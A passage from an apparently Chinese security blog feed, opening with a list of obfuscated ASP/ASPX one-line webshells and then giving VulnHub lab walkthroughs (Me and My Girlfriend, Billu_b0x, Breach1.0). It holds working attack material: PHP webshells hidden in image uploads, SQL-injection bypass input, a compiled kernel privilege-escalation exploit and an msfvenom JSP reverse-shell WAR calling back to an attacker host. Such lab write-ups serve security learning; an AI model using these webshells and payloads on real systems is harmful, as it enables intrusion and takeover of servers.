class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%a&#x3D;request(&quot;Du1&quot;)%&gt;&lt;%eval a%&gt;</span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;Du1&quot;))%&gt;</span><br><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;  &#x2F;&#x2F; å¯†ç ï¼š-2</span><br></pre></td></tr></table></figure><h2 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX"></a>ASPX</h2><h3 id="ä¸€å¥è¯-1"><a href="#ä¸€å¥è¯-1" class="headerlink" title="ä¸€å¥è¯"></a>ä¸€å¥è¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; validateRequest&#x3D;&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;w&quot;],&quot;Du1&quot;));%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…</title>
      <link href="2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>å¼€å§‹å­¦ç‚¹æ›´æœ‰æ„æ€çš„ï¼Œä» VlunHub å¼€å§‹åˆ·åˆ·å§ã€‚</p><p>æ‰€æœ‰é¶åœºç¯å¢ƒæ¥æºï¼š<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me and My Girlfriend: 1"></a>Me and My Girlfriend: 1</h2><p>è®°å½•ä¸€ä¸‹è¸©åˆ°çš„å‘å§ï¼Œä¸€å¼€å§‹ä¸€ç›´æ‰¾ä¸åˆ° IP åœ°å€ï¼Œåæ¥å°è¯•åœ¨è‡ªå·±çš„å¦å¤–ä¸€å°è™šæ‹Ÿæœºé‡Œé¢ ifconfig çœ‹çœ‹ç½‘æ®µï¼Œå†ç”¨ Nmap æ‰¾äº†ä¸€ä¸‹ã€‚ï¼ˆè¦ç”¨ NAT æ¨¡å¼ï¼Œæ”¹å®Œä¹‹åè¦é‡å¯ï¼‰</p><p><img src="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png"></p><p>å¯ä»¥å‘ç°è¿™ä¸¤ä¸ª IPï¼Œä¸Šé¢çš„æ˜¯ğŸ‘´çš„è™šæ‹Ÿæœºçš„ IPï¼Œé‚£ä¹ˆä¸‹é¢é‚£ä¸ªå°±æ˜¯é¶æœºçš„ IP äº†ï¼Œè€Œä¸”å¯ä»¥å‘ç°åªæœ‰å®ƒå¼€å¯äº† http ä¸ ssh æœåŠ¡ï¼š</p><p><img src="https://i.loli.net/2021/05/10/SAcCMQ5KPG6L9hT.png"></p><p>è¿›å…¥é¡µé¢ï¼Œé¡µé¢å›æ˜¾ï¼š<code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></p><p>XFF æ”¹ä¸€ä¸‹ 127.0.0.1 è¿›å…¥ã€‚å‘ç°å­˜åœ¨ login ä¸ registerï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå‘ç° id ä» 12 å¼€å§‹ï¼š</p><p><img src="https://i.loli.net/2021/05/10/KXcNlg4eZusi8zU.png"></p><p>å°è¯•ä¿®æ”¹ idï¼Œå‘ç°å­˜åœ¨è¶Šæƒæ¼æ´ï¼šï¼ˆå¯ä»¥æ¨æµ‹åå°ä»£ç ä¸ºï¼š<code>selct * from user where id = intval($_GET[&#39;id&#39;]);</code></p><p><img src="https://i.loli.net/2021/05/10/vM635ZVh1cafJHU.png" alt="SL~LFWIE20__5MHIR6O4U_7.png"></p><p>å¯ä»¥çˆ†ç ´ä¸€ä¸‹å‰ 11 ä¸ª id å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç è¡¨ï¼š</p><p><img src="https://i.loli.net/2021/05/10/oBW3p8i759FjUTX.png"></p><table><thead><tr><th>id</th><th>ç”¨æˆ·å</th><th>å¯†ç </th></tr></thead><tbody><tr><td>1</td><td>eweuhtandingan</td><td>skuyatuh</td></tr><tr><td>2</td><td>aingmaung</td><td>qwerty!!!</td></tr><tr><td>3</td><td>sundatea</td><td>indONEsia</td></tr><tr><td>4</td><td>sedihaingmah</td><td>cedihhihihi</td></tr><tr><td>5</td><td>alice</td><td>4lic3</td></tr><tr><td>9</td><td>abdikasepak</td><td>dorrrrr</td></tr><tr><td>12</td><td>Du1</td><td>Du1</td></tr></tbody></table><p>ssh è¿æ¥ï¼Œæ¯ä¸ªè´¦å·éƒ½è¯•ä¸€éï¼Œæœ€åå‘ç° alice æˆåŠŸç™»ä¸Šï¼šï¼ˆå…¶å®åœ¨é¢˜ç›®æè¿°é‡Œé¢ä¹Ÿæåˆ°äº† Aliceï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæš—ç¤ºå§ï¼‰</p><p><img src="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png"></p><p>å…ˆåˆ°å¤„çœ‹çœ‹ï¼Œè·å–åˆ° flag1ï¼Œç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><p><img src="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png"></p><p>å‘ç° <code>/var/www/html/config/config.php</code> ä¸­çš„è¿™ä¸€å¥ï¼š<code>$conn = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;ctf_pasti_bisa&#39;, &#39;ceban_corp&#39;)</code>ã€‚å¥½å®¶ä¼™ï¼Œæ•°æ®åº“æ˜¯ root ç”¨æˆ·ï¼Œç›´æ¥ <code>su root</code> ç™»ä¸€æ³¢ï¼Œå‘ç° flag2</p><p><img src="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png"></p><h2 id="Billu-b0x"><a href="#Billu-b0x" class="headerlink" title="Billu_b0x"></a>Billu_b0x</h2><p>Nmap æ‰«æä¸€ä¸‹ç«¯å£åŠæœåŠ¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹ http æœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæç¤ºè¯´ â€œShow me your SQLI skillsâ€ï¼Œåº”è¯¥æ˜¯è¦ sql æ³¨å…¥ã€‚</p><p>æ‰«ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€äº›é¡µé¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[07:43:17] 200 -  307B  - &#x2F;add</span><br><span class="line">[07:43:19] 200 -    1B  - &#x2F;c</span><br><span class="line">[07:43:21] 200 -    1KB - &#x2F;images&#x2F;</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index.php</span><br><span class="line">[07:43:21] 200 -   47KB - &#x2F;in</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel  -&gt;  index.php</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel.php  -&gt;  index.php</span><br><span class="line">[07:43:23] 200 -    8KB - &#x2F;phpmy&#x2F;</span><br><span class="line">[07:43:23] 200 -    1B  - &#x2F;show</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test.php</span><br></pre></td></tr></table></figure><p>åœ¨ test.php å‘ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;POST http:&#x2F;&#x2F;192.168.237.134&#x2F;test.php</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠæ‰€æœ‰é¡µé¢çš„æºç ä¸‹è½½ä¸‹æ¥ï¼š</p><ul><li>add.php æ˜¯ä¸€ä¸ªæ— æ³•ä½¿ç”¨åŠŸèƒ½çš„ä¸Šä¼ é¡µé¢</li><li>in.php é‡Œæ˜¯ phpinfoï¼Œæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯</li><li>c.php æ˜¯æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œå‘ç° <code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code>ï¼Œä»è€ŒçŸ¥é“æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·åå¯†ç </li><li>/etc/passwd ä¸­æœ‰ä¸€ä¸ª id ä¸º 1000 çš„ç”¨æˆ·ï¼Œåä¸º ica</li></ul><p>è®¿é—® phpmyï¼Œç”¨æˆ‘ä»¬è·å¾—çš„æ•°æ®åº“å¯†ç å»ç™»å½•è®¿é—®ã€‚</p><p><img src="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png"></p><p>è·å–åˆ° index.php ä¸­ç™»é™†çš„ç”¨æˆ·åä¸å¯†ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure><p>è¿›å…¥ã€‚</p><p><img src="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png"></p><p>panel.php ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹ upload çš„ä¸Šä¼ é€»è¾‘å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$r</span>,<span class="variable">$image</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å†™ä¸ª <code>&lt;?php @eval($_POST[&quot;Du1&quot;]);phpinfo(); ?&gt;</code> çš„ğŸï¼Œåç¼€æ”¹ä¸‹ pngï¼Œä¼ ä¸Šå»åŒ…å«ä¸€ä¸‹å°± ok äº†ï¼š</p><p><img src="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png"></p><p>åå¼¹ä¸€ä¸‹ shellï¼Œç„¶åæ€ä¹ˆéƒ½åå¼¹ä¸å›ï¼Œå¾ˆçƒ¦ï¼Œæ‰€ä»¥ç›´æ¥å†™ä¸ªğŸåˆ° upload_images é‡Œé¢ï¼š<code>echo%20&#39;&lt;?php%20eval($_POST[&quot;Du1&quot;]);?&gt;&#39;%20&gt;%20uploaded_images/1.php</code>ï¼Œèšå‰‘è¿ä¸Šï¼šï¼ˆuploaded_images æœ‰å†™æƒé™ï¼‰</p><p><img src="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png"></p><p><code>uname -a</code> ä¸ <code>cat /etc/issue</code> æŸ¥çœ‹å†…æ ¸åŠç³»ç»Ÿç‰ˆæœ¬ï¼Œå¯»æ‰¾ææƒ expï¼š<a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>ç„¶åä¼ ä¸Šå»ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp.c  # èµ‹äºˆæƒé™</span><br><span class="line">gcc exp.c -o exp  # ç¼–è¯‘</span><br><span class="line">./exp  # æ‰§è¡Œï¼Œææƒè‡³ root</span><br></pre></td></tr></table></figure><p>ç™»å½•é‚£é‡Œå…¶å®è¿˜æœ‰å¦ä¸€ç§è§£æ³•ï¼šä¹‹å‰æåˆ°è¿‡ sql æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å®¡è®¡ä¸€ä¸‹ index.php æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•çš„è¿‡æ»¤ï¼ŒæŠŠå•å¼•å·å»æ‰ï¼Œæˆ‘ä»¬ç”¨ <code>\</code> é€ƒé€¸æ‰å°± ok äº†ï¼š<code>ps=\&amp;un=or 1=1 #</code>ã€‚</p><p>å¯¹äº root çš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯ phpmyadmin çš„é…ç½®æ–‡ä»¶è¯»å–ï¼š<code>/var/www/phpmy/config.inc.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;roottoor&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿åˆ° root å¯†ç ã€‚</p><hr><p>æ³¨ï¼š</p><ul><li>ææƒæ–¹æ³•å¯ä»¥å¤šå…³æ³¨ä¸»è¦çš„é…ç½®æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥æ–‡ä»¶ã€ç”¨æˆ·çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨Ubuntuå·²çŸ¥æ¼æ´æœ¬åœ°ææƒ</li><li>MySQL æœ‰å¯èƒ½è¢«é«˜çº¿ç¨‹ç›®å½•æš´ç ´å’Œæ³¨å…¥å®•æœº</li></ul><h2 id="Breach1-0"><a href="#Breach1-0" class="headerlink" title="Breach1.0"></a>Breach1.0</h2><p>æ³¨ï¼š</p><p>VM è™šæœºé…ç½®æœ‰é™æ€IPåœ°å€ï¼ˆ192.168.110.140ï¼‰ï¼Œéœ€è¦å°†è™šæ‹Ÿæœºç½‘å¡è®¾ç½®ä¸º host-only æ–¹å¼ç»„ç½‘ã€‚</p><p>å…·ä½“æ–¹æ³•ï¼šç‚¹å¼€ç½‘ç»œé€‚é…å™¨ï¼Œé…ç½® vm net1 -&gt; å±æ€§ -&gt; TCP/IPV4 -&gt; ipï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.1</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.110.254</span><br></pre></td></tr></table></figure><hr><p>Nmap æ‰«ä¸€ä¸‹å‘ç°å®ƒæŠŠæ‰€æœ‰ç«¯å£éƒ½å¼€æ”¾äº†ï¼ˆå¯ä»¥ç”¨ -sF ç»•è¿‡é˜²æ¢æµ‹ç­–ç•¥ï¼‰â€¦â€¦æˆ‘ä»¬ç›´æ¥è®¿é—® httpã€‚åœ¨ <a href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> å¯ä»¥ç™»å½• cmsã€‚</p><p><img src="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png"></p><p>åœ¨ index æ³¨é‡Šä¸­æ‰¾åˆ°ä¸€æ®µ Base64ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>è·å¾—ç”¨æˆ·åä¸å¯†ç ï¼Œç™»å½•ã€‚</p><p>Inbox ä¸­æœ‰ä¸‰å°é‚®ä»¶ï¼Œåœ¨ç¬¬ä¸‰å°é‚®ä»¶ä¸­å‘ç° <a href="http://192.168.110.140/.keystore">http://192.168.110.140/.keystore</a> å­˜åœ¨ä¸€ä¸ª SSL certificateã€‚View Account ä¸­çš„ Content æœ‰ä¸€ä¸ª SSL implementation test captureï¼Œå‘ç°æµé‡åŒ… <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%EF%BC%8C%E5%90%8C%E6%97%B6%E8%8E%B7%E5%8F%96%E5%88%B0%E6%8F%90%E7%A4%BA%EF%BC%9A%60They">http://192.168.110.140/impresscms/_SSL_test_phase1.pcapï¼ŒåŒæ—¶è·å–åˆ°æç¤ºï¼š`They</a> told me the alias, storepassword and keypassword are all set to â€˜tomcatâ€™.`ï¼Œæç¤ºäº†åˆ«åã€å­˜å‚¨å¯†ç å’Œå¯†é’¥å¯†ç éƒ½è®¾ç½®ä¸º tomcatã€‚</p><p>åˆ©ç”¨ JDK çš„ keytool.exe è§£å¯†ï¼Œé¦–å…ˆæŸ¥çœ‹ keystore ä¸­çš„æ‰€æœ‰è¯ä¹¦ï¼š</p><p><code> keytool -list -keystore ./keystore</code>ï¼šï¼ˆå¯†é’¥åº“å£ä»¤ tomcatï¼‰</p><p><img src="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png"></p><p>ä»å¯†é’¥åº“ä¸­å¯¼å‡º .p12 è¯ä¹¦ï¼Œå°† keystore æ‹·è´åˆ° keytool ç›®å½•ï¼Œå¯¼å‡ºåä¸º tomcatkeystore.p12 çš„è¯ä¹¦ï¼š</p><p><code>keytool -importkeystore -srckeystore ./keystore -destkeystore tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</code></p><p><img src="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png"></p><p>ç„¶åå°† .p12 è¯ä¹¦å¯¼å…¥æ‰“å¼€äº†æµé‡åŒ…çš„ WireSharkï¼šç¼–è¾‘ -&gt; é¦–é€‰é¡¹ -&gt; Protocols -&gt; TLS -&gt; EDITï¼ˆæœ€æ–°ç‰ˆ WireShark å·²ç»æŠŠ SSLæ”¹ä¸º TLSï¼Œå…¶å® SSL/TLS éƒ½å·²ç»Ÿç§°é€šä¿¡åŠ å¯†åè®®ï¼Œæ‰€ä»¥å°±æ”¾ä¸€å—äº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.140 8443 http ç‚¹å‡»é€‰æ‹©è¯ä¹¦æ–‡ä»¶ è¾“å…¥å¯†ç tomcat</span><br></pre></td></tr></table></figure><p>å› ä¸º <em>8443 æ˜¯ tomcat æ‰“å¼€ SSL çš„æ–‡æœ¬æœåŠ¡çš„é»˜è®¤ç«¯å£</em></p><p>è‡³æ­¤æˆåŠŸè§£å¯†æµé‡ï¼Œåˆ†æå¯ä»¥å‘ç°å…¶ä¸­å­˜åœ¨ jsp æœ¨é©¬çš„æµé‡ï¼Œä»¥åŠé‡‡ç”¨ http basic è®¤è¯ç™»å½•åå°çš„æµé‡ï¼Œç»è¿‡ Base64 è§£å¯†åå¾—åˆ° tomcat ç”¨æˆ·ååŠå¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>è®¿é—® <a href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/htmlï¼Œå¦‚æœç™»å½•ä¸æˆåŠŸå¯ä»¥å°è¯•</a> BP å‘åŒ…ï¼ˆå› ä¸ºæœ€æ–°ç‰ˆæµè§ˆå™¨å¦‚æœæ²¡æœ‰ç›¸åº”è¯ä¹¦ä¼šæœ‰é™åˆ¶ï¼Œä½†æ˜¯ BP ä¸­æœ‰å„ç§è¯ä¹¦ï¼ŒæŒ‚ä¸ª BP ä»£ç†å°±ä¸Šäº†ï¼‰</p><p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p><p>å¯ä»¥ä¸Šä¼ åŒ…å« jsp é©¬çš„ war åŒ…ï¼Œåˆ©ç”¨ msf ç›´æ¥ç”Ÿæˆï¼š<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>ï¼Œåœ¨ msf ä¸Šè®¾ç½®ä¸€ä¸ªç›‘å¬ï¼Œç„¶åç›´æ¥ä¼ é©¬è®¿é—®ï¼šï¼ˆå¼¹å›æ¥çš„ shell è¦ç­‰å·¨ JB ä¹…ï¼ŒğŸ‘´æ˜¯è¦æ”¾å¼ƒçš„æ—¶å€™çªç„¶å‘ç°ï¼Œæ¬¸ï¼Œæ€ä¹ˆ connect äº†ï¼‰</p><p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p><p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p><p>æ­¤æ—¶æ‹¿åˆ°äº† shell äº†ï¼Œå¯ä»¥ç”¨ python æ¥è·å–äº¤äº’å¼ shellï¼š<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p><p><img src="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:&#x2F;home&#x2F;milton:&#x2F;bin&#x2F;bash</span><br><span class="line">tomcat6:x:104:112::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false</span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">blumbergh:x:1001:1001:Bill 